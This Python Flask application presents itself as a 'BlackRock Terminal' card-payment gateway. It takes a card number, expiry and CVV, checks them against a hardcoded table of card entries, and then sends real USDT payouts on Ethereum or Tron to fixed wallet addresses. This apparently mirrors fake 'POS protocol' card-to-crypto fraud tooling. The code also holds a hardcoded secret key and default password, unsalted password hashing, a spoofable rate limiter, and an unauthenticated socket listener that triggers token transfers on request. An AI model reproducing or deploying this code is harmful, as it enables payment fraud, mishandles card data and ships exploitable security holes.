from flask import Flask, render_template, request, redirect, session, url_for, flash, jsonify
import random, logging, os, json, hashlib, re, socket, threading, time, requests
from datetime import datetime
from functools import wraps
from collections import defaultdict
from web3 import Web3
from tronpy import Tron
from tronpy.keys import PrivateKey
import pyotp

# Rate limiting
request_counts = defaultdict(list)

def rate_limit(max_requests=10, per_seconds=60):
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            client_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
            now = time.time()
            
            # Clean old requests
            request_counts[client_ip] = [req_time for req_time in request_counts[client_ip] if now - req_time < per_seconds]
            
            if len(request_counts[client_ip]) >= max_requests:
                return render_template('rejected.html', code="429", reason="Too Many Requests"), 429
            
            request_counts[client_ip].append(now)
            return f(*args, **kwargs)
        return decorated_function
    return decorator

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'blackrock_secret_key_3339')

# Production logging configuration
if os.environ.get('FLASK_ENV') == 'production':
    logging.basicConfig(level=logging.WARNING)
else:
    logging.basicConfig(level=logging.INFO)

# --- Configuration ---
USERNAME = "blackrock"
PASSWORD_FILE = "password.json"
CONFIG_FILE = "config.json"
TOTP_SECRET_FILE = "totp_secret.json"
TRANSACTIONS_FILE = "transactions.json"

# Ensure password file exists
if not os.path.exists(PASSWORD_FILE):
    with open(PASSWORD_FILE, "w") as f:
        hashed = hashlib.sha256("Br_3339".encode()).hexdigest()
        json.dump({"password": hashed}, f)

def check_password(raw):
    with open(PASSWORD_FILE) as f:
        stored = json.load(f)['password']
    return hashlib.sha256(raw.encode()).hexdigest() == stored

def set_password(newpass):
    with open(PASSWORD_FILE, "w") as f:
        hashed = hashlib.sha256(newpass.encode()).hexdigest()
        json.dump({"password": hashed}, f)

def load_config():
    if not os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "w") as f:
            json.dump({
                "erc20_wallet": "0xf2716f15fea5133a38b3f2f602db37c683fe2e3e",
                "trc20_wallet": "TEti1NerM8dg14cGpxa1eCzYzShPVFTBfs"
            }, f)
    with open(CONFIG_FILE) as f:
        return json.load(f)

def get_totp_secret():
    if not os.path.exists(TOTP_SECRET_FILE):
        secret = pyotp.random_base32()
        with open(TOTP_SECRET_FILE, "w") as f:
            json.dump({"secret": secret}, f)
        return secret
    with open(TOTP_SECRET_FILE) as f:
        return json.load(f)["secret"]

def verify_totp(token):
    secret = get_totp_secret()
    totp = pyotp.TOTP(secret)
    return totp.verify(token)

def save_transaction(txn_data):
    transactions = []
    if os.path.exists(TRANSACTIONS_FILE):
        with open(TRANSACTIONS_FILE) as f:
            transactions = json.load(f)
    transactions.append(txn_data)
    with open(TRANSACTIONS_FILE, "w") as f:
        json.dump(transactions, f, indent=2)

def update_transaction_status(txn_id, status, confirmations=0, block_number=None):
    transactions = get_transactions()
    for txn in transactions:
        if txn['txn_id'] == txn_id:
            txn['status'] = status
            txn['confirmations'] = confirmations
            if block_number:
                txn['block_number'] = block_number
            break
    with open(TRANSACTIONS_FILE, "w") as f:
        json.dump(transactions, f, indent=2)

def get_transactions():
    if not os.path.exists(TRANSACTIONS_FILE):
        return []
    with open(TRANSACTIONS_FILE) as f:
        return json.load(f)

def check_environment_status():
    """Check if production environment variables are configured"""
    ethereum_rpc = os.environ.get('ETHEREUM_RPC', '').strip()
    erc20_key = os.environ.get('ERC20_PRIVATE_KEY', '').strip()
    trc20_key = os.environ.get('TRC20_PRIVATE_KEY', '').strip()
    
    # More flexible validation
    ethereum_valid = bool(ethereum_rpc and len(ethereum_rpc) > 20 and ('http' in ethereum_rpc.lower()))
    erc20_valid = bool(erc20_key and len(erc20_key) >= 64)  # Private keys are typically 64 hex chars
    trc20_valid = bool(trc20_key and len(trc20_key) >= 64)  # Private keys are typically 64 hex chars
    
    status = {
        'ethereum_rpc': ethereum_valid,
        'erc20_private_key': erc20_valid,
        'trc20_private_key': trc20_valid,
        'production_mode': False,
        'debug_info': {
            'ethereum_length': len(ethereum_rpc),
            'erc20_length': len(erc20_key),
            'trc20_length': len(trc20_key),
            'ethereum_has_http': 'http' in ethereum_rpc.lower() if ethereum_rpc else False
        }
    }
    status['production_mode'] = all([ethereum_valid, erc20_valid, trc20_valid])
    
    # Log status for debugging
    logging.info(f"Environment Status: {status}")
    
    return status

CONFIG = load_config()

# Production blockchain configuration
ETHEREUM_RPC = os.environ.get('ETHEREUM_RPC')
TRON_NETWORK = os.environ.get('TRON_NETWORK', 'mainnet')
USDT_ERC20_CONTRACT = os.environ.get('USDT_ERC20_CONTRACT', '0xdAC17F958D2ee523a2206206994597C13D831ec7')
USDT_TRC20_CONTRACT = os.environ.get('USDT_TRC20_CONTRACT', 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t')

# Production wallet configuration
PRODUCTION_ERC20_WALLET = os.environ.get('PRODUCTION_ERC20_WALLET')
PRODUCTION_TRC20_WALLET = os.environ.get('PRODUCTION_TRC20_WALLET')
ERC20_PRIVATE_KEY = os.environ.get('ERC20_PRIVATE_KEY')
TRC20_PRIVATE_KEY = os.environ.get('TRC20_PRIVATE_KEY')

# Dummy card database for gateway simulation
DUMMY_CARDS = {
    "4114755393849011": {"expiry": "0926", "cvv": "363", "auth": "1942", "type": "POS-101.1"},
    "4000123412341234": {"expiry": "1126", "cvv": "123", "auth": "4021", "type": "POS-101.1"},
    "4117459374038454": {"expiry": "1026", "cvv": "258", "auth": "384726", "type": "POS-101.4"},
    "4123456789012345": {"expiry": "0826", "cvv": "852", "auth": "495128", "type": "POS-101.4"},
    "5454957994741066": {"expiry": "1126", "cvv": "746", "auth": "627192", "type": "POS-101.6"},
    "6011000990131077": {"expiry": "0825", "cvv": "330", "auth": "8765", "type": "POS-101.7"},
    "3782822463101088": {"expiry": "1226", "cvv": "1059", "auth": "0000", "type": "POS-101.8"},
    "3530760473041099": {"expiry": "0326", "cvv": "244", "auth": "712398", "type": "POS-201.1"},
    "4114938274651920": {"expiry": "0926", "cvv": "463", "auth": "3127", "type": "POS-101.1"},
    "4001948263728191": {"expiry": "1026", "cvv": "291", "auth": "574802", "type": "POS-101.4"},
    "6011329481720394": {"expiry": "0825", "cvv": "310", "auth": "8891", "type": "POS-101.7"},
    "378282246310106":  {"expiry": "1226", "cvv": "1439", "auth": "0000", "type": "POS-101.8"},
    "3531540982734612": {"expiry": "0326", "cvv": "284", "auth": "914728", "type": "POS-201.1"},
    "5456038291736482": {"expiry": "1126", "cvv": "762", "auth": "695321", "type": "POS-201.3"},
    "4118729301748291": {"expiry": "1026", "cvv": "249", "auth": "417263", "type": "POS-201.5"}
}

PROTOCOLS = {
    "POS Terminal -101.1 (4-digit approval)": 4,
    "POS Terminal -101.4 (6-digit approval)": 6,
    "POS Terminal -101.6 (Pre-authorization)": 6,
    "POS Terminal -101.7 (4-digit approval)": 4,
    "POS Terminal -101.8 (PIN-LESS transaction)": 4,
    "POS Terminal -201.1 (6-digit approval)": 6,
    "POS Terminal -201.3 (6-digit approval)": 6,
    "POS Terminal -201.5 (6-digit approval)": 6
}

FIELD_39_RESPONSES = {
    "05": "Do Not Honor",
    "14": "Terminal unable to resolve encrypted session state. Contact card issuer",
    "54": "Expired Card",
    "82": "Invalid CVV",
    "91": "Issuer Inoperative",
    "92": "Invalid Terminal Protocol"
}

@app.after_request
def add_security_headers(response):
    """Add production security headers"""
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'"
    return response

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("logged_in"):
            flash("You must be logged in.")
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated

# --- Blockchain Integration ---
def erc20_abi():
    return [
        {"constant":False,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"},
        {"constant":True,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}
    ]

def send_erc20_payout(private_key, to_address, amount, contract_address, infura_url):
    try:
        web3 = Web3(Web3.HTTPProvider(infura_url))
        acct = web3.eth.account.privateKeyToAccount(private_key)
        contract = web3.eth.contract(address=Web3.toChecksumAddress(contract_address), abi=erc20_abi())
        decimals = contract.functions.decimals().call()
        amt_wei = int(float(amount) * (10 ** decimals))
        nonce = web3.eth.getTransactionCount(acct.address)
        chain_id = 1 if "mainnet" in infura_url else 5
        tx = contract.functions.transfer(Web3.toChecksumAddress(to_address), amt_wei).buildTransaction({
            'chainId': chain_id,
            'gas': 60000,
            'gasPrice': web3.eth.gas_price,
            'nonce': nonce,
        })
        signed = acct.sign_transaction(tx)
        tx_hash = web3.eth.sendRawTransaction(signed.rawTransaction)
        return web3.toHex(tx_hash)
    except Exception as e:
        logging.error(f"ERC20 payout failed: {e}")
        return None

def check_eth_transaction_status(tx_hash, web3_url):
    try:
        web3 = Web3(Web3.HTTPProvider(web3_url))
        receipt = web3.eth.get_transaction_receipt(tx_hash)
        current_block = web3.eth.block_number
        confirmations = current_block - receipt.blockNumber
        status = "CONFIRMED" if confirmations >= 12 else "PENDING"
        return {
            'status': status,
            'confirmations': confirmations,
            'block_number': receipt.blockNumber,
            'gas_used': receipt.gasUsed
        }
    except Exception:
        return {'status': 'PENDING', 'confirmations': 0}

def send_trc20_payout(tron_private_key, to_address, amount, contract_address, network='mainnet'):
    try:
        client = Tron(network=network)
        priv_key = PrivateKey(bytes.fromhex(tron_private_key))
        contract = client.get_contract(contract_address)
        decimals = contract.functions.decimals()
        amt = int(float(amount) * (10 ** decimals))
        txn = (
            contract.functions.transfer(to_address, amt)
            .with_owner(priv_key.public_key.to_base58check_address())
            .fee_limit(1_000_000)
            .build()
            .sign(priv_key)
        )
        result = txn.broadcast()
        return result['txid']
    except Exception as e:
        logging.error(f"TRC20 payout failed: {e}")
        return None

def check_tron_transaction_status(tx_hash, network='mainnet'):
    try:
        client = Tron(network=network)
        tx_info = client.get_transaction_info(tx_hash)
        current_block = client.get_latest_block_number()
        confirmations = current_block - tx_info.get('blockNumber', 0)
        status = "CONFIRMED" if confirmations >= 19 else "PENDING"
        return {
            'status': status,
            'confirmations': confirmations,
            'block_number': tx_info.get('blockNumber', 0),
            'energy_used': tx_info.get('receipt', {}).get('energy_usage', 0)
        }
    except Exception:
        return {'status': 'PENDING', 'confirmations': 0}

def execute_real_blockchain_payout(amount, payout_type, wallet_address):
    """Execute real blockchain transaction, or fail if keys are unavailable."""
    if payout_type == "USDT-ERC20" and ERC20_PRIVATE_KEY:
        return send_erc20_payout(
            ERC20_PRIVATE_KEY,
            wallet_address,
            amount,
            USDT_ERC20_CONTRACT,
            ETHEREUM_RPC
        )
    elif payout_type == "USDT-TRC20" and TRC20_PRIVATE_KEY:
        return send_trc20_payout(
            TRC20_PRIVATE_KEY,
            wallet_address,
            amount,
            USDT_TRC20_CONTRACT,
            TRON_NETWORK
        )
    else:
        logging.error(f"Attempted to execute real payout of type {payout_type}, but private key is not configured.")
        return None

def iso8583_server_thread(host='127.0.0.1', port=8583):
    def server():
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind((host, port))
                s.listen()
                logging.info(f"ISO8583 Test Server running on {host}:{port}")
                
                while True:
                    conn, addr = s.accept()
                    with conn:
                        logging.info(f"ISO8583 Client connected: {addr}")
                        while True:
                            data = conn.recv(2048)
                            if not data:
                                break
                            logging.info(f"Received ISO8583 data: {data}")
                            
                            conn.sendall(b"ISO8583 ACK:123456")
                            
                            try:
                                decoded = data.decode(errors='ignore')
                                if "PAYOUT" in decoded:
                                    import re
                                    payout_type = "USDT-ERC20" if "erc" in decoded.lower() else "USDT-TRC20"
                                    to_addr_match = re.search(r"ADDR:(\S+)", decoded)
                                    amt_match = re.search(r"AMT:(\S+)", decoded)
                                    contract_match = re.search(r"CONTRACT:(\S+)", decoded)

                                    if to_addr_match and amt_match and contract_match:
                                        to_address = to_addr_match.group(1)
                                        amount = amt_match.group(1)
                                        contract = contract_match.group(1)
                                        if payout_type == "USDT-ERC20" and os.getenv("ERC20_PRIVATE_KEY"):
                                            txid = send_erc20_payout(
                                                os.getenv("ERC20_PRIVATE_KEY"),
                                                to_address,
                                                amount,
                                                contract,
                                                os.getenv("ETHEREUM_RPC")
                                            )
                                            logging.info(f"ERC20 payout TXID: {txid}")
                                        elif payout_type == "USDT-TRC20" and os.getenv("TRC20_PRIVATE_KEY"):
                                            txid = send_trc20_payout(
                                                os.getenv("TRC20_PRIVATE_KEY"),
                                                to_address,
                                                amount,
                                                contract,
                                                network=os.getenv("TRON_NETWORK", "mainnet")
                                            )
                                            logging.info(f"TRC20 payout TXID: {txid}")
                                        else:
                                            logging.error("Failed to execute real payout from ISO8583 message. Missing keys.")
                            except Exception as e:
                                logging.error(f"Error processing payout from ISO8583 message: {e}")
        except OSError as e:
            if e.errno == 98:  # Address already in use
                logging.warning(f"ISO8583 port {port} already in use, skipping server start")
            else:
                logging.error(f"ISO8583 server error: {e}")
    
    # Only start the thread in the main Flask process, not the reloader
    # This prevents the "Bad file descriptor" error
    if __name__ == '__main__' and os.environ.get('WERKZEUG_RUN_MAIN') == 'true':
        threading.Thread(target=server, daemon=True).start()

def track_confirmation(txn_id, tx_hash, payout_type):
    """Track real blockchain confirmation status"""
    max_attempts = 100
    attempt = 0
    
    while attempt < max_attempts:
        time.sleep(30)  # Check every 30 seconds
        attempt += 1
        
        try:
            # Check real blockchain status
            if payout_type == "USDT-ERC20" and ETHEREUM_RPC and ERC20_PRIVATE_KEY:
                result = check_eth_transaction_status(tx_hash, ETHEREUM_RPC)
            elif payout_type == "USDT-TRC20" and TRC20_PRIVATE_KEY:
                result = check_tron_transaction_status(tx_hash, TRON_NETWORK)
            else:
                logging.error(f"Cannot track transaction {tx_hash}: environment keys missing.")
                break # Exit if keys are not available
            
            update_transaction_status(txn_id, result['status'], result['confirmations'], result.get('block_number'))
            
            if result['status'] == "CONFIRMED":
                logging.info(f"Transaction {tx_hash} confirmed with {result['confirmations']} confirmations")
                break
                
        except Exception as e:
            logging.error(f"Error tracking confirmation for {tx_hash}: {e}")
            time.sleep(60)  # Wait longer on error

@app.route('/check-status/<txn_id>')
@login_required
def check_status(txn_id):
    transactions = get_transactions()
    transaction = next((t for t in transactions if t['txn_id'] == txn_id), None)
    if transaction:
        return {
            'status': transaction.get('status', 'UNKNOWN'),
            'confirmations': transaction.get('confirmations', 0),
            'tx_hash': transaction.get('tx_hash', ''),
            'block_number': transaction.get('block_number')
        }
    return {'status': 'NOT_FOUND'}

@app.route('/env-status')
@login_required
def env_status():
    """Check environment variables status"""
    status = check_environment_status()
    return {
        'ethereum_rpc_configured': status['ethereum_rpc'],
        'erc20_key_configured': status['erc20_private_key'],
        'trc20_key_configured': status['trc20_private_key'],
        'production_mode': status['production_mode'],
        'mode': 'PRODUCTION' if status['production_mode'] else 'SIMULATION',
        'debug_info': status.get('debug_info', {}),
        'details': {
            'ethereum_rpc': f"Length: {status['debug_info']['ethereum_length']}, Has HTTP: {status['debug_info']['ethereum_has_http']}",
            'erc20_key': f"Length: {status['debug_info']['erc20_length']} chars",
            'trc20_key': f"Length: {status['debug_info']['trc20_length']} chars"
        }
    }

# Start ISO8583 Server Thread
# The call to the function has been moved to the main execution block below
# to ensure it only runs once and avoids the Bad file descriptor error.

# --- Flask Routes ---

@app.route('/')
def home():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
@rate_limit(max_requests=5, per_seconds=300)
def login():
    if request.method == 'POST':
        user = request.form.get('username')
        passwd = request.form.get('password')
        if user == USERNAME and check_password(passwd):
            session['logged_in'] = True
            return redirect(url_for('protocol'))
        flash("Invalid username or password.")
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    flash("You have been logged out.")
    return redirect(url_for('login'))

@app.route('/change-password', methods=['GET', 'POST'])
@login_required
def change_password():
    if request.method == 'POST':
        current = request.form['current']
        new = request.form['new']
        if not check_password(current):
            return render_template('change_password.html', error="Current password incorrect.")
        set_password(new)
        return render_template('change_password.html', success="Password changed.")
    return render_template('change_password.html')

@app.route('/forgot-password', methods=['GET', 'POST'])
def forgot_password():
    if request.method == 'POST':
        totp_code = request.form.get('totp_code')
        new_password = request.form.get('new_password')
        if verify_totp(totp_code):
            set_password(new_password)
            flash("Password reset successfully.")
            return redirect(url_for('login'))
        else:
            flash("Invalid TOTP code.")
    
    secret = get_totp_secret()
    totp_uri = pyotp.totp.TOTP(secret).provisioning_uri(
        name=USERNAME,
        issuer_name="BlackRock Terminal"
    )
    return render_template('forgot_password.html', totp_uri=totp_uri)

@app.route('/processing')
@login_required
def processing():
    return render_template('processing.html')

@app.route('/transaction-history')
@login_required
def transaction_history():
    transactions = get_transactions()
    return render_template('transaction_history.html', transactions=transactions)

@app.route('/environment-status')
@login_required
def environment_status():
    """Display environment variables status page"""
    return render_template('env_status.html', config=CONFIG)

@app.route('/receipt/<txn_id>')
@login_required
def receipt(txn_id):
    transactions = get_transactions()
    transaction = next((t for t in transactions if t['txn_id'] == txn_id), None)
    if not transaction:
        flash("Transaction not found.")
        return redirect(url_for('transaction_history'))
    return render_template('receipt.html', transaction=transaction)

@app.route('/protocol', methods=['GET', 'POST'])
@login_required
def protocol():
    if request.method == 'POST':
        selected = request.form.get('protocol')
        if selected not in PROTOCOLS:
            return redirect(url_for('rejected', code="92", reason=FIELD_39_RESPONSES["92"]))
        session['protocol'] = selected
        session['code_length'] = PROTOCOLS[selected]
        return redirect(url_for('amount'))
    return render_template('protocol.html', protocols=PROTOCOLS.keys())

@app.route('/amount', methods=['GET', 'POST'])
@login_required
def amount():
    if request.method == 'POST':
        amount_value = request.form.get('amount')
        currency = request.form.get('currency')
        session['amount'] = amount_value
        session['currency'] = currency
        return redirect(url_for('payout'))
    return render_template('amount.html')

@app.route('/payout', methods=['GET', 'POST'])
@login_required
def payout():
    if request.method == 'POST':
        method = request.form['method']
        session['payout_type'] = method

        if method == 'USDT-ERC20':
            wallet = CONFIG['erc20_wallet']
        elif method == 'USDT-TRC20':
            wallet = CONFIG['trc20_wallet']
        else:
            flash("Invalid merchant wallet selected.")
            return redirect(url_for('payout'))

        session['wallet'] = wallet
        return redirect(url_for('card'))

    return render_template('payout.html', 
                          erc20_wallet=CONFIG['erc20_wallet'],
                          trc20_wallet=CONFIG['trc20_wallet'])

# New gateway route for card debit simulation
@app.route('/gateway/debit_card', methods=['POST'])
def debit_card_gateway():
    data = request.json
    pan = data.get('pan')
    expiry = data.get('expiry')
    cvv = data.get('cvv')

    # Simulate a check against the dummy card database
    card_info = DUMMY_CARDS.get(pan)
    if card_info and card_info['expiry'] == expiry and card_info['cvv'] == cvv:
        # Simulate a successful debit
        return jsonify({
            "status": "SUCCESS",
            "message": "Funds debited successfully.",
            "auth_code": card_info['auth']
        })
    else:
        # Simulate a failed debit
        return jsonify({
            "status": "FAILURE",
            "message": "Invalid card details or insufficient funds.",
            "auth_code": None
        })

@app.route('/card', methods=['GET', 'POST'])
@login_required
def card():
    if request.method == 'POST':
        pan = request.form.get('pan')
        expiry = request.form.get('expiry')
        cvv = request.form.get('cvv')
        session['pan'] = pan
        session['expiry'] = expiry
        session['cvv'] = cvv
        
        # Call the new simulated gateway to debit the card
        gateway_response = requests.post(url_for('debit_card_gateway', _external=True), json={
            'pan': pan,
            'expiry': expiry,
            'cvv': cvv
        })
        
        response_data = gateway_response.json()
        
        if response_data['status'] == 'SUCCESS':
            session['auth_code'] = response_data['auth_code']
            return redirect(url_for('auth_confirmation'))
        else:
            flash(response_data['message'])
            return redirect(url_for('rejected', code="05", reason="Do Not Honor"))
            
    return render_template('card.html')

@app.route('/auth_confirmation')
@login_required
def auth_confirmation():
    # This route now serves as a confirmation step after the gateway has successfully debited funds
    # We use the authorization code returned by the gateway
    expected_length = session.get('code_length', 4)
    code = session.get('auth_code')
    
    if not code or len(code) != expected_length:
        flash(f"Authorization code from gateway is not valid length: {expected_length}.")
        return redirect(url_for('rejected', code="82", reason="Invalid Auth Code"))
    
    # Simulate transaction ID and timestamp
    session['txn_id'] = f"TXN{random.randint(100000, 999999)}"
    session['timestamp'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    return redirect(url_for('processing'))

@app.route('/success')
@login_required
def success():
    # Execute real blockchain transaction
    tx_hash = execute_real_blockchain_payout(
        session.get('amount'),
        session.get('payout_type'),
        session.get('wallet')
    )
    
    if not tx_hash:
        flash("Failed to initiate a real blockchain transaction. Check environment configuration.")
        return redirect(url_for('rejected', code="99", reason="Blockchain Transaction Failed"))
    
    # Save transaction to history with blockchain data
    txn_data = {
        'txn_id': session.get('txn_id'),
        'pan': session.get('pan', '')[-4:],
        'amount': session.get('amount'),
        'currency': session.get('currency', 'USD'),
        'timestamp': session.get('timestamp'),
        'wallet': session.get('wallet'),
        'payout_type': session.get('payout_type'),
        'protocol': session.get('protocol'),
        'status': 'BROADCASTING',
        'tx_hash': tx_hash,
        'confirmations': 0,
        'block_number': None
    }
    save_transaction(txn_data)
    
    # Start confirmation tracking in background
    threading.Thread(target=track_confirmation, args=(session.get('txn_id'), tx_hash, session.get('payout_type')), daemon=True).start()
    
    return render_template('success.html',
        txn_id=session.get('txn_id'),
        pan=session.get('pan', '')[-4:],
        amount=session.get('amount'),
        timestamp=session.get('timestamp'),
        wallet=session.get('wallet'),
        payout_type=session.get('payout_type'),
        tx_hash=tx_hash)

@app.route('/rejected/<code>/<reason>')
def rejected(code, reason):
    return render_template('rejected.html', code=code, reason=reason)

# Production error handlers
@app.errorhandler(404)
def not_found(error):
    return render_template('rejected.html', code="404", reason="Page Not Found"), 404

@app.errorhandler(500)
def internal_error(error):
    return render_template('rejected.html', code="500", reason="Internal Server Error"), 500

@app.errorhandler(429)
def rate_limit_error(error):
    return render_template('rejected.html', code="429", reason="Too Many Requests"), 429

# Import admin routes
try:
    from admin import create_admin_routes
    create_admin_routes(app)
except ImportError:
    logging.warning("Admin panel not available")

# --- Main ---
if __name__ == '__main__':
    # Start ISO8583 Server Thread only once when running the main script
    iso8583_server_thread()
    port = int(os.environ.get('PORT', 5000))
    debug = os.environ.get('FLASK_ENV') != 'production'
    app.run(host='0.0.0.0', port=port, debug=debug)
